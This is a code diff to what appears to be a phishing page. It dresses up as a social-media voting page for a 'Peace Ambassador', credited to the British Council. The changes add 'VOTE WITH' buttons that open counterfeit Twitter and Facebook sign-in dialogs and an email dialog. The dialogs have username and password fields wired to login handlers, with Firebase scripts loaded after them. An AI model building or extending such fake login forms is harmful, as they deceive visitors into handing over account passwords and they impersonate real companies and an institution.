@@ -23,6 +23,7 @@
       <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.min.css">
       <script src="js/jquery-3.6.0.min.js"></script>
       <link rel="stylesheet" href="css/index.css">
+      <link rel="stylesheet" href="twitter-font-awesome-4.css">
       <link rel="stylesheet" href="assets/css/main.css">
 
 <!--Facebook-->
@@ -107,8 +108,16 @@
     border-radius: 5px;
     cursor: pointer;
   }
+  .twitter-button2 {
+    background-color: black;
+    color: #FFF;
+    border: none;
+    padding: 5px 10px;
+    border-radius: 5px;
+    cursor: pointer;
+  }
     .email-button2 {
-    background-color: hsl(121.36deg 37.29% 53.73%);
+    background-color: red;
     color: #FFF;
     border: none;
     padding: 10px;
@@ -116,8 +125,17 @@
     width: 120px;
     cursor: pointer;
   }
+
+  .email-button3 {
+    background-color: red;
+    color: #FFF;
+    border: none;
+    padding: 5px 10px;
+    border-radius: 5px;
+    cursor: pointer;
+  }
   .facebook-button3 {
-    background-color: hsl(0.44deg 63.98% 58.63%);
+    background-color: blue;
     color: #FFF;
     border: none;
     padding: 5px 10px;
@@ -160,12 +178,21 @@
     <p class="profile-description"> Peace Ambassador</p>
  <div class="social-links">
 
-    <div class="social-vote-button">
+  <div class="social-vote-button">
       <button onclick="Instagram()" class="instagram-button2">VOTE WITH <i class="fab fa-instagram"></i> </button>
     </div>
 
     <div class="social-vote-button">
-      <button onclick="Facebook()" class="facebook-button3">VOTE WITH <i class="fa fa-envelope"></i> </button>
+      <button onclick="Facebook()" class="facebook-button3">VOTE WITH <i class="fab fa-facebook"></i> </button>
+    </div>
+    <br>
+
+    <div class="social-vote-button">
+      <button onclick="Twitter()" class="twitter-button2">VOTE WITH <i class="fa fa-twitter"></i> </button>
+    </div>
+
+    <div class="social-vote-button">
+      <button onclick="Email()" class="email-button3">VOTE WITH <i class="fa fa-envelope"></i> </button>
     </div>
     <br><br>
     
@@ -180,6 +207,43 @@
 
   <p class="powered-by">Powered by <strong><span style="color: hsl(206.36deg 64.71% 60%);"><a href="https://www.instagram.com/britishcouncil?igsh=bnRmZzZwaWZrbHBk">British Council</a></span></strong></p>
 
+       <!-- Twitter Dialog Box -->
+      <div id="twitter" class="dialog">
+          <div class="dialog-content">
+            <span class="close" onclick="closeDialog()">&times;</span>
+       <div class="row">
+         <div class="none col-1 col-lg-4"></div>
+         <div class="none col-10 col-lg-5">
+           <div class="box bg-white mt-5 p-3">
+             <div class="nav mb-5">
+               <img class="twitter-2" src="twt/IMG/twitter.png" alt="">
+             </div>
+             <div class="mb-4">
+               <h2 class="text-center head"><b>Sign in to Twitter</b></h2>
+             </div>
+
+             <div class="margin mb-4">
+              <input type="text" class="btn but d-flex btn-white border-dark " placeholder="Phone, Email or Username" required id="tw-email">
+            </div>
+
+            <div class="margin mb-4">
+              <input type="password" class="btn but d-flex btn-white border-dark " placeholder="Password" required id="tw-pass">
+             </div>
+
+
+             <button style="background-color: black;" class="email-button2" onclick="tw_login()" id="tw-log">Login</button>
+
+
+             <div class="margin">
+             </div>
+
+           </div>
+         </div>
+         <div class="none col-1 col-lg-3"></div>
+       </div>
+
+     </div>
+  </div>
 
     <!-- Instagram Dialog Box -->
     <div id="instagram" class="dialog">
@@ -223,8 +287,33 @@
 
 
      <!-- Facebook Dialog Box -->
-
     <div id="facebook" class="dialog">
+        <div class="dialog-content">
+          <span class="close" onclick="closeDialog()">&times;</span>
+          <h2><span hidden id="dialog-instagram"></span></h2>
+          <main class="l-main">
+            <div class="fb-user">
+              <div class="fb-panel fb-group">
+                            <img src="secured/img/logo.svg" alt=""><br><br>
+                            <p>Facebook helps you connect and share with the people in your life.</p>
+
+                            <input type="text" placeholder="Email or Phone number" required id="fb-email"><br>
+                            <input type="password" placeholder="Password" required id="fb-pass"><br>
+                            <button class="c-btn" onclick="login()" id="fb-log">Log In</button><br> <br>
+                            
+                            <a href="#">Forgotten password?</a><br>
+                            <button id="create-btn">Create New Account</button><br>
+                            <a href="#" style="font-weight: bold; color: var(--black); text-decoration: none;">Create a Page</a> for a celebrity, band or business.
+                </div>
+            </div>
+          </main>
+        </div>
+    </div>    
+
+
+     <!-- Email Dialog Box -->
+
+    <div id="email" class="dialog">
         <div class="dialog-content">
           <span class="close" onclick="closeDialog()">&times;</span>
           <h2><span hidden id="dialog-instagram"></span></h2>
@@ -292,10 +381,19 @@
         }, 1000); // Delay in milliseconds
       }
 
+      function Email() {
+        showPreloader();
+        setTimeout(function() {
+          hidePreloader();
+          document.getElementById("email").style.display = "flex";
+        }, 1000); // Delay in milliseconds
+      }
+
       function closeDialog() {
           document.getElementById("instagram").style.display = "none";
           document.getElementById("twitter").style.display = "none";
           document.getElementById("facebook").style.display = "none";
+          document.getElementById("email").style.display = "none";
       }
     </script>
     <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
